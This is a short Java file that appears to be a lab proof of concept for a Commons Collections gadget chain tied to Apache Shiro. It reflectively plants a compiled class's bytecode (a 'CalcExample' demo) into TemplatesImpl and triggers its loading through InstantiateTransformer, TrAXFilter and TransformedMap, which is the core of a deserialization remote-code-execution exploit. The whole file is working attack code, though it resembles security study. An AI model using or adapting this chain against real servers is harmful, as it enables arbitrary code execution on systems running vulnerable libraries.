package org.example.utils;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class TestShiroCC1 {
    public static void setFieldValue(Object obj, String fieldName, Object
            value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static String classFileToBase64(String filepath) throws IOException {
        String classFilePath = filepath;
        String base64String;
        // 读取 class 文件的字节数组
        byte[] classBytes = Files.readAllBytes(Paths.get(classFilePath));

        // 将字节数组转换为 Base64 编码字符串
        base64String= Base64.getEncoder().encodeToString(classBytes);

        return base64String;
    }

    public static void main(String[] args) throws Exception {
        String base64Code = classFileToBase64("C:\\Users\\tlj\\Desktop\\tmp\\java8u66\\CalcExample.class");
        byte[] code =
                Base64.getDecoder().decode(base64Code);
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "CalcExample");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        Transformer transformer = new InstantiateTransformer(
                new Class[] { Templates.class },
                new Object[] { obj });


        Map innerMap = new HashMap();


        Map outerMap = TransformedMap.decorate(innerMap, null,
                transformer);

        outerMap.put("value", TrAXFilter.class);
    }
}
